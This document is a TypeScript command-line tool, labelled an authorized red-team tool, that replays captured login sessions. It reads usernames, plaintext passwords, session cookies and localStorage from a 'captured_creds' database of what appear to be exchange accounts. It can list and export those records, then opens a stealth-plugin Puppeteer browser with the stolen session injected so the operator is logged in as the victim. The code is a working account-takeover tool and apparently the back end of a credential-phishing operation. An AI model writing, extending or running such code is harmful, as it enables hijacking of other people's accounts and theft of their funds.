/**
 * Session replay — authorized red-team tool.
 *
 * Reads a session capture JSON file (cookies + localStorage) and opens a
 * Puppeteer browser with the session pre-injected.
 *
 * Usage:
 *   pnpm session-replay --cookies capture.json --url https://target.example/login
 *   pnpm session-replay --export-db --id <uuid> --out capture.json
 *   pnpm session-replay --export-db --id <uuid> --url https://target.example --launch
 *   pnpm session-replay --list
 */
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import { readFile, writeFile } from 'node:fs/promises'
import path from 'node:path'
import type { Pool } from 'pg'

import {
  buildSessionCaptureExport,
  cookiesForPuppeteer,
  parseLocalStorage,
  parseSessionCaptureFile,
  resolveTargetUrl,
  type SessionCaptureFile,
} from './lib/session-cookie-utils.js'

type DbCredRow = {
  id: string
  exchange: string
  username: string
  password: string
  session_cookies: string | null
  local_storage: string | null
  created_at: string
}

function fail(msg: string): never {
  console.error(`[session-replay] ${msg}`)
  process.exit(1)
}

function readArg(flag: string): string | undefined {
  const idx = process.argv.indexOf(flag)
  return idx !== -1 ? process.argv[idx + 1]?.trim() : undefined
}

function hasFlag(flag: string): boolean {
  return process.argv.includes(flag)
}

function normalizeDatabaseConnectionString(raw: string): string {
  return raw.trim()
}

function getPool(): Pool {
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) fail('DATABASE_URL not configured')
  return createDatabaseAnchorPool(normalizeDatabaseConnectionString(url), {
    max: 3,
    connectionTimeoutMillis: 10_000,
  })
}

async function readCaptureFile(filePath: string): Promise<SessionCaptureFile> {
  const raw = await readFile(path.resolve(filePath), 'utf8')
  return parseSessionCaptureFile(JSON.parse(raw) as unknown)
}

async function listCredsWithCookies(pool: Pool): Promise<DbCredRow[]> {
  const result = await pool.query(
    `SELECT id, exchange, username, password, session_cookies, local_storage, created_at
     FROM captured_creds
     WHERE session_cookies IS NOT NULL AND TRIM(session_cookies) <> ''
     ORDER BY created_at DESC
     LIMIT 50`,
  )
  return result.rows.map((row) => ({
    id: String(row.id),
    exchange: String(row.exchange),
    username: String(row.username),
    password: String(row.password),
    session_cookies: row.session_cookies != null ? String(row.session_cookies) : null,
    local_storage: row.local_storage != null ? String(row.local_storage) : null,
    created_at:
      row.created_at instanceof Date ? row.created_at.toISOString() : String(row.created_at),
  }))
}

async function getCredById(pool: Pool, id: string): Promise<DbCredRow | null> {
  const result = await pool.query(
    `SELECT id, exchange, username, password, session_cookies, local_storage, created_at
     FROM captured_creds WHERE id = $1::uuid`,
    [id],
  )
  const row = result.rows[0]
  if (!row) return null
  return {
    id: String(row.id),
    exchange: String(row.exchange),
    username: String(row.username),
    password: String(row.password),
    session_cookies: row.session_cookies != null ? String(row.session_cookies) : null,
    local_storage: row.local_storage != null ? String(row.local_storage) : null,
    created_at:
      row.created_at instanceof Date ? row.created_at.toISOString() : String(row.created_at),
  }
}

async function launchSessionReplay(
  capture: SessionCaptureFile,
  targetUrl: string,
  headless: boolean,
): Promise<void> {
  const cookies = cookiesForPuppeteer(capture, targetUrl)
  const localStorage = parseLocalStorage(capture)

  try {
    const puppeteerExtra = await import('puppeteer-extra')
    const stealthMod = await import('puppeteer-extra-plugin-stealth')
    const StealthPlugin = stealthMod.default ?? stealthMod
    const puppeteer = puppeteerExtra.default ?? puppeteerExtra
    puppeteer.use(StealthPlugin())

    const browser = await puppeteer.launch({
      headless,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    })
    const page = await browser.newPage()

    const originUrl = new URL(targetUrl)
    const seedUrl = `${originUrl.protocol}//${originUrl.host}/`

    await page.goto(seedUrl, { waitUntil: 'domcontentloaded', timeout: 60_000 })
    if (cookies.length) {
      await page.setCookie(...cookies)
    }
    if (localStorage) {
      await page.evaluate((data) => {
        Object.entries(data).forEach(([k, v]) => {
          try {
            localStorage.setItem(k, v)
          } catch {
            /* ignore */
          }
        })
      }, localStorage)
    }

    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 90_000 })

    console.info(`[session-replay] Browser open — ${targetUrl}`)
    if (capture.username) {
      console.info(`[session-replay] Captured user: ${capture.username}`)
    }
    console.info('[session-replay] Close the browser window when done.')
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (msg.includes('puppeteer')) {
      fail('puppeteer-extra not installed — run: pnpm install')
    }
    fail(msg)
  }
}

let pool: Pool | null = null

async function main(): Promise<void> {
  const cookiesFile = readArg('--cookies')
  const targetUrl = readArg('--url')
  const outFile = readArg('--out')
  const dbId = readArg('--id')
  const headless = hasFlag('--headless')

  if (hasFlag('--help') || hasFlag('-h')) {
    console.info(
      '[session-replay] Usage:\n' +
        '  pnpm session-replay --cookies capture.json --url https://target.example/login\n' +
        '  pnpm session-replay --cookies capture.json --url https://target.example/login --headless\n' +
        '  pnpm session-replay --export-db --id <uuid> --out capture.json\n' +
        '  pnpm session-replay --export-db --id <uuid> --url https://target.example --launch\n' +
        '  pnpm session-replay --list',
    )
    return
  }

  if (hasFlag('--list')) {
    pool = getPool()
    const rows = await listCredsWithCookies(pool)
    if (!rows.length) {
      console.info('[session-replay] No captured sessions with cookies in database.')
      return
    }
    for (const row of rows) {
      console.info(
        `${row.id}  ${row.exchange.padEnd(20)}  ${row.username.slice(0, 24).padEnd(24)}  ${row.created_at}`,
      )
    }
    return
  }

  if (hasFlag('--export-db')) {
    if (!dbId) fail('--export-db requires --id <uuid>')
    pool = getPool()
    const cred = await getCredById(pool, dbId)
    if (!cred) fail(`Credential not found: ${dbId}`)
    if (!cred.session_cookies) fail('This record has no session cookies')

    const exportPayload = buildSessionCaptureExport({
      id: cred.id,
      exchange: cred.exchange,
      username: cred.username,
      session_cookies: cred.session_cookies,
      local_storage: cred.local_storage,
      created_at: cred.created_at,
      url: targetUrl ?? `https://${cred.exchange}`,
    })

    const outPath = path.resolve(outFile ?? `session-capture-${cred.id.slice(0, 8)}.json`)
    await writeFile(outPath, `${JSON.stringify(exportPayload, null, 2)}\n`, 'utf8')
    console.info(`[session-replay] Wrote ${outPath}`)

    if (hasFlag('--launch')) {
      const url = resolveTargetUrl(exportPayload, targetUrl)
      await launchSessionReplay(exportPayload, url, headless)
    }
    return
  }

  if (!cookiesFile) {
    fail(
      'Usage:\n' +
        '  pnpm session-replay --cookies capture.json --url https://target.example/login\n' +
        '  pnpm session-replay --cookies capture.json --url https://target.example/login --headless\n' +
        '  pnpm session-replay --export-db --id <uuid> --out capture.json\n' +
        '  pnpm session-replay --export-db --id <uuid> --url https://target.example --launch\n' +
        '  pnpm session-replay --list',
    )
  }

  const capture = await readCaptureFile(cookiesFile)
  const url = resolveTargetUrl(capture, targetUrl)
  await launchSessionReplay(capture, url, headless)
}

main()
  .catch((e) => fail(e instanceof Error ? e.message : String(e)))
  .finally(async () => {
    await pool?.end().catch(() => {})
  })
